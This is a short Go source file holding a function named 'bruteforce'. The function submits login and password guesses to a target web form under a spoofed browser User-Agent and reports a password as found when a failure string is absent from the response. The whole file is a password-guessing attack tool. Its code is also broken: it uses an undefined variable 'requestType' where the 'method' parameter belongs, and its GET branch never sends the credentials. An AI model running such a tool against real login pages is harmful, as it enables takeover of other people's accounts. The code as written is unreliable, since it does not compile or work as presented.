package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"

	"golang.org/x/net/html/charset"
)

func bruteforce(
	target string,
	method string,
	login string,
	password string,
	loginField string,
	passwordField string,
	stop string,
) string {
	client := &http.Client{}
	var request *http.Request
	var err error
	if method == "POST" {
		data := url.Values{
			loginField:    {login},
			passwordField: {password},
		}
		buffer := bytes.NewBuffer([]byte(data.Encode()))
		request, err = http.NewRequest(requestType, target, buffer)
	}

	if method == "GET" {
		request, err = http.NewRequest(requestType, target, nil)
	}
	if err != nil {
		return ""
	}
	request.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.99")

	response, err := client.Do(request)
	if err != nil {
		return ""
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return fmt.Sprintf("Error status code: %d with password %s", response.StatusCode, password)
	}
	responseText, _ := charset.NewReader(response.Body, response.Header.Get("Content-type"))
	text, _ := ioutil.ReadAll(responseText)
	if strings.Contains(string(text), stop) {
		return ""
	}
	return password
}
